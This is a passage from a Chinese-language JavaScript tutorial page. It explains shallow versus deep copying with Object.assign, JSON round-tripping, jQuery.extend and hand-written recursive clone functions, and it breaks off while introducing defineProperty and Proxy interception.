  <span class="token keyword">return</span> <span class="token function">Fibonacci2</span><span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> f2<span class="token punctuation">,</span> f1 <span class="token operator">+</span> f2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">// Fibonacci2(100) // 573147844013817200000</span>
<span class="token comment">// Fibonacci2(1000) // 7.0330367711422765e+208</span>
<span class="token comment">// Fibonacci2(10000) // Infinity</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Fibonacci2</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//13</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br></div></div><h4 id="_6-深浅拷贝"><a href="#_6-深浅拷贝" class="header-anchor">#</a> 6:深浅拷贝</h4> <h5 id="浅拷贝"><a href="#浅拷贝" class="header-anchor">#</a> 浅拷贝</h5> <blockquote><p>只复制指向某个对象的指针，而不复制对象本身，<strong>新旧对象还是共享同一块内存</strong>。</p></blockquote> <p><strong>实现方式</strong></p> <ul><li><code>Object.assign()</code>：需注意的是目标对象<strong>只有一层的时候，是深拷贝</strong></li> <li><code>Array.prototype.concat()</code></li> <li><code>Array.prototype.slice()</code></li> <li><strong>扩展运算符<code>spread</code>(...)</strong>：转换数组为用逗号分隔的参数序列(<strong><code>[...arr]</code>，<code>spread</code>相当于<code>rest参数</code>的逆运算</strong>)； ES6 的合并数组, [...arr1, ...arr2];</li></ul> <h5 id="深拷贝"><a href="#深拷贝" class="header-anchor">#</a> 深拷贝</h5> <blockquote><p><strong>就是在拷贝数据的时候，将数据的所有引用结构都拷贝一份</strong>。简单的说就是，在内存中存在两个数据结构完全相同又相互独立的数据，<strong>将引用型类型进行复制，而不是只复制其引用关系</strong>。</p></blockquote> <p>深拷贝的做法一般分两种：</p> <ul><li><code>JSON.parse(JSON.stringify(a))</code> 简单深遍历；但是这种拷贝方法<strong>不可以拷贝一些特殊的属性</strong>（例如正则表达式，undefine，function）；</li> <li>递归浅拷贝；</li></ul> <p>第一种做法存在一些局限，很多情况下并不能使用；第二种做法一般是工具库中的深拷贝函数实现方式，比如 loadash 中的 <code>cloneDeep</code>。</p> <p><strong>实现方式</strong></p> <ul><li><code>JSON.parse(JSON.stringify())</code>。简单数据类型；<strong>记得这个特殊</strong>；</li> <li>热门的函数库lodash，也有提供**<code>_.cloneDeep</code>用来做深拷贝**</li> <li>jquery 提供一个<code>$.extend</code>可以用来做深拷贝,  这个也有深浅拷贝之分(false,true)；</li> <li><strong>手写递归拷贝</strong></li></ul> <h5 id="库原理实现"><a href="#库原理实现" class="header-anchor">#</a> 库原理实现</h5> <p><strong>Object.assign</strong></p> <blockquote><p>跟遍历深拷贝类似</p></blockquote> <p>实现一个 <code>Object.assign</code> 大致思路如下：</p> <ul><li><p>1、判断原生 <code>Object</code> 是否支持该函数，如果不存在的话创建一个函数 <code>assign</code>，并使用 <code>Object.defineProperty</code> 将该函数绑定到 <code>Object</code> 上。</p></li> <li><p>2、判断参数是否正确（目标对象不能为空，我们可以直接设置{}传递进去,但必须设置值）。</p></li> <li><p>3、使用 <code>Object()</code> 转成对象，并保存为 to，最后返回这个对象 to。</p></li> <li><p>4、使用 <code>for..in</code> 循环遍历<strong>出所有可枚举的自有属性</strong>。并复制给新的目标对象（使用 <code>hasOwnProperty</code> 获取自有属性，即非原型链上的属性）。</p></li></ul> <p>实现代码如下，这里为了验证方便，使用 <code>assign2</code> 代替 <code>assign</code>。注意<strong>此模拟实现不支持 <code>symbol</code> 属性，因为<code>ES5</code> 中根本没有 <code>symbol</code> 。</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> Object<span class="token punctuation">.</span>assign2 <span class="token operator">!=</span> <span class="token string">'function'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>Object<span class="token punctuation">,</span> <span class="token string">&quot;assign2&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> <span class="token comment">// Attention 1</span>
    <span class="token function-variable function">value</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">target</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token string">'use strict'</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">// Attention 2</span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TypeError</span><span class="token punctuation">(</span><span class="token string">'Cannot convert undefined or null to object'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">var</span> to <span class="token operator">=</span> <span class="token function">Object</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Attention 3</span>
      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> index <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> index <span class="token operator">&lt;</span> arguments<span class="token punctuation">.</span>length<span class="token punctuation">;</span> index<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">var</span> nextSource <span class="token operator">=</span> arguments<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>nextSource <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// Attention 4</span>
          <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> nextKey <span class="token keyword">in</span> nextSource<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>nextSource<span class="token punctuation">,</span> nextKey<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
              to<span class="token punctuation">[</span>nextKey<span class="token punctuation">]</span> <span class="token operator">=</span> nextSource<span class="token punctuation">[</span>nextKey<span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
          <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">return</span> to<span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    writable<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
    configurable<span class="token operator">:</span> <span class="token boolean">true</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br></div></div><p>测试使用：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token punctuation">{</span>
    name<span class="token operator">:</span> <span class="token string">&quot;advanced&quot;</span><span class="token punctuation">,</span>
    age<span class="token operator">:</span> <span class="token number">18</span>
<span class="token punctuation">}</span>
<span class="token keyword">let</span> b <span class="token operator">=</span> <span class="token punctuation">{</span>
    name<span class="token operator">:</span> <span class="token string">&quot;samy&quot;</span><span class="token punctuation">,</span>
    book<span class="token operator">:</span> <span class="token punctuation">{</span>
        title<span class="token operator">:</span> <span class="token string">&quot;You Don't Know JS&quot;</span><span class="token punctuation">,</span>
        price<span class="token operator">:</span> <span class="token string">&quot;45&quot;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">//let c = Object.assign(a, b);</span>
<span class="token keyword">let</span> c <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">assign2</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// {</span>
<span class="token comment">// 	name: &quot;samy&quot;,</span>
<span class="token comment">//  age: 18,</span>
<span class="token comment">// 	book: {title: &quot;You Don't Know JS&quot;, price: &quot;45&quot;}</span>
<span class="token comment">// } </span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a <span class="token operator">===</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// true</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><p><strong>JSON.stringify</strong></p> <p><strong>原理</strong>：是将<strong>对象转化为字符串, 而字符串是简单数据类型</strong>;  JSON复制不能处理一些特定的数据类型，例如<strong>undefined、NaN、function</strong>等其他数据类型（具体情况视浏览器而定）。但可以保证的是，JSON复制可以正确处理以下数据类型的对象属性：<strong>数组、普通对象、数字、字符串、布尔值</strong>。</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">var</span> <span class="token function-variable function">deepClone</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">var</span> _tmp<span class="token punctuation">,</span>result<span class="token punctuation">;</span>
    _tmp <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
    result <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>_tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">let</span> target <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>source<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p><strong>jquery.extend</strong></p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>jQuery<span class="token punctuation">.</span>extend <span class="token operator">=</span> jQuery<span class="token punctuation">.</span>fn<span class="token punctuation">.</span><span class="token function-variable function">extend</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token comment">//.....xxxxx</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>deep <span class="token operator">&amp;&amp;</span>copy <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>jQuery<span class="token punctuation">.</span><span class="token function">isPlainObject</span><span class="token punctuation">(</span>copy<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span>copyIsArray <span class="token operator">=</span> jQuery<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>copy<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>copyIsArray<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      copyIsArray <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
      clone <span class="token operator">=</span> src <span class="token operator">&amp;&amp;</span> jQuery<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span> <span class="token operator">?</span> src <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      clone <span class="token operator">=</span> src <span class="token operator">&amp;&amp;</span> jQuery<span class="token punctuation">.</span><span class="token function">isPlainObject</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span> <span class="token operator">?</span> src <span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// Never move original objects, clone them</span>
    target<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> jQuery<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span>deep<span class="token punctuation">,</span> clone<span class="token punctuation">,</span> copy<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// Don't bring in undefined values</span>
  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>copy <span class="token operator">!==</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    target<span class="token punctuation">[</span>name<span class="token punctuation">]</span> <span class="token operator">=</span> copy<span class="token punctuation">;</span>
  <span class="token punctuation">}</span> 
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>使用：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">//浅拷贝（只复制一份原始对象的引用）</span>
<span class="token keyword">var</span> newObject <span class="token operator">=</span> $<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> oldObject<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//深拷贝（对原始对象属性所引用的对象进行进行递归拷贝）;</span>
<span class="token keyword">var</span> newObject <span class="token operator">=</span> $<span class="token punctuation">.</span><span class="token function">extend</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> oldObject<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h5 id="自定义-递归拷贝"><a href="#自定义-递归拷贝" class="header-anchor">#</a> 自定义（递归拷贝）</h5> <p><strong>原理</strong>：要拷贝一个数据，<strong>肯定要去遍历它的属性，如果这个对象的属性仍是对象，继续使用这个方法，如此往复</strong>。</p> <p>步骤：【<strong>以实现一般对象和数组对象的克隆</strong>】</p> <ol><li>判断复制的目标是数组还是对象；</li> <li><code>for in</code> 遍历目标；结合 <code>hasOwnProperty</code> 判断是否是自己属性；使用 <code>for..in</code> 循环遍历<strong>出所有可枚举的自有属性</strong>。并复制给新的目标对象（使用 <code>hasOwnProperty</code> 获取自有属性，即非原型链上的属性）。</li> <li>赋值给新对象；如果不是对象，就直接赋值；如果值是对象，就接着递归一下；设置类型，重复1,2;</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">deepClone</span><span class="token punctuation">(</span><span class="token parameter">source</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//方式三：高级版本：考虑只拷贝自己的属性；及用constructor判断类型；</span>
  <span class="token keyword">const</span> targetObj <span class="token operator">=</span> source<span class="token punctuation">.</span>constructor <span class="token operator">===</span> Array <span class="token operator">?</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment">// 判断复制的目标是数组还是对象</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> keys <span class="token keyword">in</span> source<span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">// 遍历目标</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>source<span class="token punctuation">.</span><span class="token function">hasOwnProperty</span><span class="token punctuation">(</span>keys<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span>source<span class="token punctuation">[</span>keys<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> source<span class="token punctuation">[</span>keys<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">'object'</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">// 如果值是对象，就递归一下</span>
        targetObj<span class="token punctuation">[</span>keys<span class="token punctuation">]</span> <span class="token operator">=</span> source<span class="token punctuation">[</span>keys<span class="token punctuation">]</span><span class="token punctuation">.</span>constructor <span class="token operator">===</span> Array <span class="token operator">?</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
        targetObj<span class="token punctuation">[</span>keys<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">deepClone</span><span class="token punctuation">(</span>source<span class="token punctuation">[</span>keys<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token comment">// 如果不是，就直接赋值</span>
        targetObj<span class="token punctuation">[</span>keys<span class="token punctuation">]</span> <span class="token operator">=</span> source<span class="token punctuation">[</span>keys<span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> targetObj<span class="token punctuation">;</span>
<span class="token punctuation">}</span>  
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>普通实现深度遍历：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">simpleClone</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//浅拷贝</span>
    <span class="token keyword">let</span> newObj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        newObj<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> newObj<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">//方式一：直接用instancof/typeof判断；【推荐】简洁；</span>
<span class="token keyword">function</span> <span class="token function">deepClone</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">var</span> newObj<span class="token operator">=</span> obj <span class="token keyword">instanceof</span> <span class="token class-name">Array</span><span class="token operator">?</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> key <span class="token keyword">in</span> obj<span class="token punctuation">)</span><span class="token punctuation">{</span>
       <span class="token comment">// newObj[key]= typeof obj[key]=='object'? deepClone(obj[key]):obj[key]; </span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">&quot;object&quot;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//判断obj子元素是否为对象，如果是递归复制</span>
            newObj<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">deepClone</span><span class="token punctuation">(</span>obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token comment">//如果不是，简单复制</span>
            newObj<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> newObj<span class="token punctuation">;</span>
<span class="token punctuation">}</span> 
<span class="token keyword">function</span> <span class="token function">deepClone</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//第二种方式:通过Object.prototype.toString来判断；</span>
    <span class="token keyword">let</span> result<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> obj <span class="token operator">==</span> <span class="token string">'object'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        result <span class="token operator">=</span> <span class="token function">isArray</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            result<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">isObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token function">isArray</span><span class="token punctuation">(</span>obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token function">deepClone</span><span class="token punctuation">(</span>obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">:</span>obj<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        result <span class="token operator">=</span> obj
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> result
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">isObject</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">&quot;[object Object]&quot;</span>
<span class="token punctuation">}</span>
<span class="token keyword">function</span> <span class="token function">isArray</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">&quot;[object Array]&quot;</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br></div></div><h4 id="_7-数据拦截-defineproterty-proxy"><a href="#_7-数据拦截-defineproterty-proxy" class="header-anchor">#</a> 7:数据拦截(defineProterty/proxy)</h4> <h5 id="实践"><a href="#实践" class="header-anchor">#</a> 实践</h5> <p><strong>defineProperty：无法检测数组索引赋值, 改变数组长度的变化;  但是通过数组方法来操作可以检测到</strong>；</p> <p>不能监听数组索引赋值和改变长度的变化; <strong>必须深层遍历嵌套的对象, 因为defineProterty只能劫持对象的属性</strong>, 因此我们需要对每个对象的每个属性进行遍历，如果属性值也是对象那么需要深度遍历, 显然能劫持一个完整的对象是更好的选择；</p> <p><strong>proxy</strong> ：ES6出来的方法,<strong>实质是对对象做了一个拦截</strong>, 并提供了13个处理方法；</p> <p><strong>reflect对象没有构造函数 可以监听数组索引赋值,改变数组长度的变化</strong>, 是直接监听对象的变化, 不用深层遍历;</p> <p>两个参数:对象和行为函数</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token keyword">let</span> obj <span class="token operator">=</span> <span class="token punctuation">{</span>name<span class="token operator">:</span><span class="token string">''</span><span class="token punctuation">,</span>age<span class="token operator">:</span><span class="token string">''</span><span class="token punctuation">,</span>sex<span class="token operator">:</span><span class="token string">''</span>  <span class="token punctuation">}</span>
<span class="token keyword">let</span> handler <span class="token operator">=</span> <span class="token punctuation">{</span>
  <span class="token function">get</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;get&quot;</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> Reflect<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token function">set</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">&quot;set&quot;</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> Reflect<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
